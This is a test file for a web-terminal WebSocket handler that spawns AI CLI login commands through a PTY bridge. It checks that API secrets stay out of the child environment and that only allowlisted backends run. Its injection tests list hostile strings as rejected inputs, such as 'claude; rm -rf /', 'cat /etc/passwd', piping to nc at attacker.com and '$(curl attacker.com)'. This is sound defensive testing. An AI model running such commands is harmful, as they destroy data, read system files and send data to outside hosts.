import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
import { join } from 'node:path';
import type { ServerWebSocket } from 'bun';
import {
  buildPtyEnv,
  createTerminalWebSocketHandler,
  LOGIN_COMMANDS,
  type TerminalWSData,
} from '../src/terminal-ws.ts';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

const PTY_BRIDGE_PATH = join(import.meta.dir, '..', 'src', 'pty-bridge.py');

/** Mock ServerWebSocket matching the project's established pattern. */
class MockTerminalWebSocket {
  sent: Array<string | Uint8Array> = [];
  closed = false;
  data: TerminalWSData;

  constructor(backend: string, id = `term-${crypto.randomUUID()}`) {
    this.data = { id, type: 'terminal', backend };
  }

  send(data: string | Uint8Array): void {
    this.sent.push(data);
  }

  close(): void {
    this.closed = true;
  }

  /** Decode all sent messages to strings for assertion. */
  sentText(): string {
    return this.sent
      .map((d) => (d instanceof Uint8Array ? new TextDecoder().decode(d) : d))
      .join('');
  }
}

function asWS(ws: MockTerminalWebSocket): ServerWebSocket<TerminalWSData> {
  return ws as unknown as ServerWebSocket<TerminalWSData>;
}

// ---------------------------------------------------------------------------
// 1. buildPtyEnv() — pure function unit tests
// ---------------------------------------------------------------------------

describe('buildPtyEnv', () => {
  const savedEnv: Record<string, string | undefined> = {};
  const keysToSave = [
    'PATH',
    'HOME',
    'USER',
    'SHELL',
    'TMPDIR',
    'DISPLAY',
    'TERM',
    'ANTHROPIC_API_KEY',
    'AUTH_MASTER_KEY',
    'DASHBOARD_PASSWORD',
    'OPENAI_API_KEY',
    'CODEX_API_KEY',
    'GEMINI_API_KEY',
    'GOOGLE_API_KEY',
    'CLAUDE_CONFIG_DIR',
    'CLAUDE_DATA_DIR',
    'CLAUDECODE',
    'CODEX_HOME',
    'GEMINI_CLI_HOME',
    'XDG_CONFIG_HOME',
  ];

  beforeEach(() => {
    for (const key of keysToSave) {
      savedEnv[key] = process.env[key];
    }
  });

  afterEach(() => {
    for (const key of keysToSave) {
      if (savedEnv[key] !== undefined) {
        process.env[key] = savedEnv[key];
      } else {
        delete process.env[key];
      }
    }
  });

  test('includes allowlisted env vars that are set', () => {
    process.env.PATH = '/usr/bin';
    process.env.HOME = '/home/test';
    const env = buildPtyEnv();
    expect(env.PATH).toBe('/usr/bin');
    expect(env.HOME).toBe('/home/test');
  });

  test('excludes server secrets', () => {
    process.env.ANTHROPIC_API_KEY = 'sk-ant-secret';
    process.env.AUTH_MASTER_KEY = 'master-secret';
    process.env.DASHBOARD_PASSWORD = 'dashboard-secret';
    process.env.OPENAI_API_KEY = 'sk-openai-secret';
    process.env.CODEX_API_KEY = 'codex-secret';
    process.env.GEMINI_API_KEY = 'gemini-secret';
    process.env.GOOGLE_API_KEY = 'google-secret';

    const env = buildPtyEnv();

    expect(env.ANTHROPIC_API_KEY).toBeUndefined();
    expect(env.AUTH_MASTER_KEY).toBeUndefined();
    expect(env.DASHBOARD_PASSWORD).toBeUndefined();
    expect(env.OPENAI_API_KEY).toBeUndefined();
    expect(env.CODEX_API_KEY).toBeUndefined();
    expect(env.GEMINI_API_KEY).toBeUndefined();
    expect(env.GOOGLE_API_KEY).toBeUndefined();
  });

  test('forwards CLAUDE_* env vars except CLAUDECODE', () => {
    process.env.CLAUDE_CONFIG_DIR = '/config';
    process.env.CLAUDE_DATA_DIR = '/data';
    process.env.CLAUDECODE = 'should-be-excluded';

    const env = buildPtyEnv();

    expect(env.CLAUDE_CONFIG_DIR).toBe('/config');
    expect(env.CLAUDE_DATA_DIR).toBe('/data');
    expect(env.CLAUDECODE).toBeUndefined();
  });

  test('skips undefined allowlisted vars (no "undefined" strings)', () => {
    delete process.env.DISPLAY;
    const env = buildPtyEnv();
    expect('DISPLAY' in env).toBe(false);
  });

  test('does not include CLAUDE_CONFIG_DIR when not set', () => {
    delete process.env.CLAUDE_CONFIG_DIR;
    const env = buildPtyEnv();
    expect('CLAUDE_CONFIG_DIR' in env).toBe(false);
  });

  test('forwards XDG_CONFIG_HOME for CLI tools that use XDG', () => {
    process.env.XDG_CONFIG_HOME = '/data/cli-config';
    const env = buildPtyEnv();
    expect(env.XDG_CONFIG_HOME).toBe('/data/cli-config');
  });

  test('forwards CODEX_HOME for Codex CLI auth persistence', () => {
    process.env.CODEX_HOME = '/data/cli-config/codex';
    const env = buildPtyEnv();
    expect(env.CODEX_HOME).toBe('/data/cli-config/codex');
  });

  test('forwards GEMINI_CLI_HOME for Gemini CLI auth persistence', () => {
    process.env.GEMINI_CLI_HOME = '/data/cli-config/gemini';
    const env = buildPtyEnv();
    expect(env.GEMINI_CLI_HOME).toBe('/data/cli-config/gemini');
  });

  test('always sets TERM=xterm-256color', () => {
    process.env.TERM = 'vt100';
    const env = buildPtyEnv();
    expect(env.TERM).toBe('xterm-256color');
  });

  test('suppresses browser auto-open for headless/Docker PTY sessions', () => {
    const env = buildPtyEnv();
    expect(env.BROWSER).toBe('');
    expect(env.NO_BROWSER).toBe('true');
  });
});

// ---------------------------------------------------------------------------
// 2. LOGIN_COMMANDS — static config validation
// ---------------------------------------------------------------------------

describe('LOGIN_COMMANDS', () => {
  test('maps claude to REPL (login injected server-side)', () => {
    expect(LOGIN_COMMANDS.claude).toEqual(['claude']);
  });

  test('maps codex to correct command', () => {
    expect(LOGIN_COMMANDS.codex).toEqual(['codex', 'login', '--device-auth']);
  });

  test('maps gemini to correct command', () => {
    expect(LOGIN_COMMANDS.gemini).toEqual(['gemini', 'auth', 'login']);
  });

  test('returns undefined for unknown backends', () => {
    expect(LOGIN_COMMANDS.unknown_backend).toBeUndefined();
    expect(LOGIN_COMMANDS.unknown).toBeUndefined();
  });

  test('does not contain command-injection-style backend names', () => {
    expect(LOGIN_COMMANDS['claude; rm -rf /']).toBeUndefined();
    expect(LOGIN_COMMANDS['$(whoami)']).toBeUndefined();
    expect(LOGIN_COMMANDS['claude && cat /etc/passwd']).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// 3. Terminal WS handler — open / message / close lifecycle
// ---------------------------------------------------------------------------

describe('Terminal WS handler', () => {
  let handler: ReturnType<typeof createTerminalWebSocketHandler>['handler'];
  const spawnedProcs: Array<ReturnType<typeof Bun.spawn>> = [];

  beforeEach(() => {
    const terminal = createTerminalWebSocketHandler();
    handler = terminal.handler;
  });

  afterEach(() => {
    // Kill any processes spawned during tests
    for (const proc of spawnedProcs) {
      try {
        proc.kill();
      } catch {
        // already dead
      }
    }
    spawnedProcs.length = 0;
  });

  describe('open', () => {
    test('rejects unknown backend with error message and closes WS', () => {
      const ws = new MockTerminalWebSocket('unknown-backend');
      handler.open(asWS(ws));

      const text = ws.sentText();
      expect(text).toContain('Unknown backend');
      expect(text).toContain('unknown-backend');
      expect(ws.closed).toBe(true);
    });

    test('rejects command-injection backend names without spawning', () => {
      const injections = [
        'claude; rm -rf /',
        '$(whoami)',
        'claude && cat /etc/passwd',
        'claude | nc attacker.com 4444',
        '../../../etc/passwd',
      ];

      for (const injection of injections) {
        const ws = new MockTerminalWebSocket(injection);
        handler.open(asWS(ws));

        expect(ws.closed).toBe(true);
        expect(ws.sentText()).toContain('Unknown backend');
      }
    });

    test('accepts valid backend and does not close WS', async () => {
      // Use a harmless command — the handler spawns python3 pty-bridge.py <cmd>
      // which needs python3 available. If not available, the process will fail
      // but the WS should not be immediately closed by the open handler.
      const ws = new MockTerminalWebSocket('claude');
      handler.open(asWS(ws));

      // The WS should not be closed immediately on open for a valid backend
      expect(ws.closed).toBe(false);

      // Clean up by closing the WS handler
      handler.close(asWS(ws));
    });
  });

  describe('message', () => {
    test('is no-op when session does not exist', () => {
      const ws = new MockTerminalWebSocket('claude');
      // Don't call open — no session exists
      // Should not throw
      handler.message(asWS(ws), 'hello');
    });

    test('is no-op after session is closed', () => {
      const ws = new MockTerminalWebSocket('claude');
      handler.open(asWS(ws));
      handler.close(asWS(ws));

      // Should not throw — session is gone
      handler.message(asWS(ws), 'hello');
    });
  });

  describe('close', () => {
    test('is no-op when session does not exist', () => {
      const ws = new MockTerminalWebSocket('claude');
      // Should not throw
      handler.close(asWS(ws));
    });

    test('cleans up session on close', () => {
      const ws = new MockTerminalWebSocket('claude');
      handler.open(asWS(ws));
      handler.close(asWS(ws));

      // Sending a message after close should be a no-op (session removed)
      handler.message(asWS(ws), 'should-be-ignored');
    });

    test('sends /exit to claude REPL before killing for graceful shutdown', async () => {
      const ws = new MockTerminalWebSocket('claude');
      handler.open(asWS(ws));

      // Close triggers graceful exit — /exit is sent, then kill after 500ms
      handler.close(asWS(ws));

      // Session should be removed immediately
      handler.message(asWS(ws), 'should-be-ignored');

      // Wait for the 500ms grace period kill to fire
      await new Promise((r) => setTimeout(r, 600));
    });

    test('kills non-claude backends immediately on close', () => {
      const ws = new MockTerminalWebSocket('codex');
      handler.open(asWS(ws));
      handler.close(asWS(ws));

      // Session should be removed immediately
      handler.message(asWS(ws), 'should-be-ignored');
    });
  });
});

// ---------------------------------------------------------------------------
// 4. pty-bridge.py integration tests
// ---------------------------------------------------------------------------

describe('pty-bridge.py integration', () => {
  const procs: Array<ReturnType<typeof Bun.spawn>> = [];

  afterEach(() => {
    for (const proc of procs) {
      try {
        proc.kill();
      } catch {
        // already dead
      }
    }
    procs.length = 0;
  });

  function spawnBridge(cmd: string[]): ReturnType<typeof Bun.spawn> {
    const proc = Bun.spawn(['python3', PTY_BRIDGE_PATH, ...cmd], {
      stdin: 'pipe',
      stdout: 'pipe',
      stderr: 'pipe',
      env: { ...process.env, TERM: 'xterm-256color' },
    });
    procs.push(proc);
    return proc;
  }

  /** Read stdout until timeout, collecting all chunks. */
  async function readOutput(proc: ReturnType<typeof Bun.spawn>, timeoutMs = 2000): Promise<string> {
    const reader = (proc.stdout as ReadableStream<Uint8Array>).getReader();
    const chunks: Uint8Array[] = [];
    const deadline = Date.now() + timeoutMs;

    while (Date.now() < deadline) {
      const result = await Promise.race([
        reader.read(),
        Bun.sleep(100).then(() => ({ done: false, value: undefined }) as const),
      ]);
      if (result.done) break;
      if (result.value) chunks.push(result.value);
    }

    reader.releaseLock();
    return chunks.map((c) => new TextDecoder().decode(c)).join('');
  }

  test('relays stdin to child process via PTY', async () => {
    const proc = spawnBridge(['cat']);

    proc.stdin.write('hello\n');
    proc.stdin.flush();

    await Bun.sleep(500);
    proc.stdin.end();

    const output = await readOutput(proc);
    // PTY echo + cat output: 'hello' should appear in output
    expect(output).toContain('hello');

    await proc.exited;
  });

  test('handles multi-line input', async () => {
    const proc = spawnBridge(['cat']);

    proc.stdin.write('line1\n');
    proc.stdin.flush();
    await Bun.sleep(100);

    proc.stdin.write('line2\n');
    proc.stdin.flush();
    await Bun.sleep(100);

    proc.stdin.write('line3\n');
    proc.stdin.flush();

    await Bun.sleep(500);
    proc.stdin.end();

    const output = await readOutput(proc);
    expect(output).toContain('line1');
    expect(output).toContain('line2');
    expect(output).toContain('line3');

    await proc.exited;
  });

  test('handles large paste (simulating auth code)', async () => {
    const proc = spawnBridge(['cat']);

    // Auth codes can be 100+ characters
    const authCode = `${'A'.repeat(200)}\n`;
    proc.stdin.write(authCode);
    proc.stdin.flush();

    await Bun.sleep(500);
    proc.stdin.end();

    const output = await readOutput(proc);
    // The full auth code should appear in output (PTY echo)
    expect(output).toContain('A'.repeat(50)); // At least a substantial portion

    await proc.exited;
  });

  test('rapid sequential writes all arrive', async () => {
    const proc = spawnBridge(['cat']);

    // Write 10 distinct markers rapidly
    for (let i = 0; i < 10; i++) {
      proc.stdin.write(`m${i}\n`);
      proc.stdin.flush();
    }

    await Bun.sleep(1000);
    proc.stdin.end();

    const output = await readOutput(proc);
    for (let i = 0; i < 10; i++) {
      expect(output).toContain(`m${i}`);
    }

    await proc.exited;
  });

  test('exits with child exit code 0 for successful command', async () => {
    const proc = spawnBridge(['true']);
    const code = await proc.exited;
    expect(code).toBe(0);
  });

  test('exits with non-zero for failing command', async () => {
    const proc = spawnBridge(['false']);
    const code = await proc.exited;
    expect(code).not.toBe(0);
  });

  test('stdin close causes child to exit', async () => {
    const proc = spawnBridge(['cat']);

    // Close stdin immediately
    proc.stdin.end();

    // cat should exit once stdin closes
    const code = await proc.exited;
    expect(typeof code).toBe('number');
  });
});

// ---------------------------------------------------------------------------
// 5. Bun.spawn stdin pipe — direct verification
// ---------------------------------------------------------------------------

describe('Bun.spawn stdin pipe behavior', () => {
  const procs: Array<ReturnType<typeof Bun.spawn>> = [];

  afterEach(() => {
    for (const proc of procs) {
      try {
        proc.kill();
      } catch {
        // already dead
      }
    }
    procs.length = 0;
  });

  test('stdin.write() delivers string data to child process', async () => {
    const proc = Bun.spawn(
      ['python3', '-c', 'import sys; data = sys.stdin.read(); print(f"GOT:{data}", end="")'],
      { stdin: 'pipe', stdout: 'pipe' },
    );
    procs.push(proc);

    proc.stdin.write('test-input');
    proc.stdin.end();

    const output = await new Response(proc.stdout).text();
    expect(output).toBe('GOT:test-input');
    await proc.exited;
  });

  test('stdin.write() + flush() return numbers (not Promises)', () => {
    const proc = Bun.spawn(['cat'], { stdin: 'pipe', stdout: 'pipe' });
    procs.push(proc);

    const writeResult = proc.stdin.write('hello');
    const flushResult = proc.stdin.flush();

    expect(typeof writeResult).toBe('number');
    expect(typeof flushResult).toBe('number');

    proc.stdin.end();
    proc.kill();
  });

  test('stdin.write() handles Buffer-to-string conversion path', async () => {
    const proc = Bun.spawn(
      ['python3', '-c', 'import sys; data = sys.stdin.read(); print(f"GOT:{data}", end="")'],
      { stdin: 'pipe', stdout: 'pipe' },
    );
    procs.push(proc);

    // Simulate what terminal-ws.ts does: decode Buffer, then write string
    const raw = Buffer.from('pasted-auth-code');
    const data = typeof raw === 'string' ? raw : new TextDecoder().decode(raw);
    proc.stdin.write(data);
    proc.stdin.end();

    const output = await new Response(proc.stdout).text();
    expect(output).toBe('GOT:pasted-auth-code');
    await proc.exited;
  });

  test('immediate write after spawn is not lost', async () => {
    const proc = Bun.spawn(
      ['python3', '-c', 'import sys; data = sys.stdin.read(); print(f"GOT:{data}", end="")'],
      { stdin: 'pipe', stdout: 'pipe' },
    );
    procs.push(proc);

    // Write immediately — no sleep, no waiting for "ready"
    proc.stdin.write('immediate-data');
    proc.stdin.flush();
    proc.stdin.end();

    const output = await new Response(proc.stdout).text();
    expect(output).toBe('GOT:immediate-data');
    await proc.exited;
  });
});

// ---------------------------------------------------------------------------
// 6. End-to-end: Bun.spawn + pty-bridge.py + stdin relay
// ---------------------------------------------------------------------------

describe('End-to-end stdin relay via pty-bridge', () => {
  const procs: Array<ReturnType<typeof Bun.spawn>> = [];

  afterEach(() => {
    for (const proc of procs) {
      try {
        proc.kill();
      } catch {
        // already dead
      }
    }
    procs.length = 0;
  });

  test('full pipe chain: Bun stdin → pty-bridge → PTY child', async () => {
    // This mirrors exactly what terminal-ws.ts does:
    // Bun.spawn(['python3', PTY_BRIDGE_PATH, ...cmd], { stdin: 'pipe', stdout: 'pipe' })
    const proc = Bun.spawn(['python3', PTY_BRIDGE_PATH, 'cat'], {
      stdin: 'pipe',
      stdout: 'pipe',
      stderr: 'pipe',
      env: { ...buildPtyEnv(), PATH: process.env.PATH ?? '' },
    });
    procs.push(proc);

    // Simulate what message() handler does
    const input = 'auth-code-12345\n';
    proc.stdin.write(input);
    proc.stdin.flush();

    await Bun.sleep(500);
    proc.stdin.end();

    const output = await new Response(proc.stdout).text();
    // Should contain the input (PTY echo)
    expect(output).toContain('auth-code-12345');

    await proc.exited;
  });

  test('simulated WS message handler writes to pty-bridge stdin', async () => {
    const proc = Bun.spawn(['python3', PTY_BRIDGE_PATH, 'cat'], {
      stdin: 'pipe',
      stdout: 'pipe',
      stderr: 'pipe',
      env: { ...buildPtyEnv(), PATH: process.env.PATH ?? '' },
    });
    procs.push(proc);

    // Simulate exact code path from terminal-ws.ts message handler (lines 208-211)
    const raw: string | Buffer = Buffer.from('pasted-code-xyz');
    const data = typeof raw === 'string' ? raw : new TextDecoder().decode(raw);
    proc.stdin.write(data);
    proc.stdin.flush();

    // Also send a newline to simulate Enter key
    proc.stdin.write('\n');
    proc.stdin.flush();

    await Bun.sleep(500);
    proc.stdin.end();

    const output = await new Response(proc.stdout).text();
    expect(output).toContain('pasted-code-xyz');

    await proc.exited;
  });
});

// ---------------------------------------------------------------------------
// 7. Security invariants
// ---------------------------------------------------------------------------

describe('Security invariants', () => {
  test('buildPtyEnv() does not leak secrets into child process env', async () => {
    // Set every known secret, then verify the PTY child cannot see any of them
    const secrets: Record<string, string> = {
      ANTHROPIC_API_KEY: 'sk-ant-secret-test',
      AUTH_MASTER_KEY: 'master-secret-test',
      DASHBOARD_PASSWORD: 'dashboard-secret-test',
      OPENAI_API_KEY: 'sk-openai-secret-test',
      CODEX_API_KEY: 'codex-secret-test',
      GEMINI_API_KEY: 'gemini-secret-test',
      GOOGLE_API_KEY: 'google-secret-test',
    };

    const saved: Record<string, string | undefined> = {};
    for (const [k, v] of Object.entries(secrets)) {
      saved[k] = process.env[k];
      process.env[k] = v;
    }

    try {
      const env = buildPtyEnv();
      // Verify none of the secret values appear anywhere in the env
      const envValues = Object.values(env);
      for (const secretVal of Object.values(secrets)) {
        expect(envValues).not.toContain(secretVal);
      }
      // Verify none of the secret keys appear
      const envKeys = Object.keys(env);
      for (const secretKey of Object.keys(secrets)) {
        expect(envKeys).not.toContain(secretKey);
      }
    } finally {
      for (const [k] of Object.entries(secrets)) {
        if (saved[k] !== undefined) {
          process.env[k] = saved[k];
        } else {
          delete process.env[k];
        }
      }
    }
  });

  test('unknown backend names are rejected without spawning processes', () => {
    const terminal = createTerminalWebSocketHandler();
    const { handler } = terminal;

    const maliciousNames = [
      'claude; rm -rf /',
      '$(curl attacker.com)',
      '`id`',
      'claude\nauth\nlogin',
      '../../../bin/sh',
      'ollama',
      '',
    ];

    for (const name of maliciousNames) {
      const ws = new MockTerminalWebSocket(name);
      handler.open(asWS(ws));
      expect(ws.closed).toBe(true);
    }
  });

  test('only exactly 4 backends are allowed', () => {
    const allowedBackends = Object.keys(LOGIN_COMMANDS);
    expect(allowedBackends).toHaveLength(4);
    expect(allowedBackends.sort()).toEqual(['claude', 'codex', 'gemini', 'pi']);
  });

  test('LOGIN_COMMANDS values only contain safe CLI args', () => {
    for (const [_backend, args] of Object.entries(LOGIN_COMMANDS)) {
      for (const arg of args) {
        // No shell metacharacters in command args
        expect(arg).not.toMatch(/[;&|`$(){}<>!#~]/);
        // No path traversal
        expect(arg).not.toContain('..');
        // No whitespace (each arg should be a single token)
        expect(arg).not.toMatch(/\s/);
      }
    }
  });
});
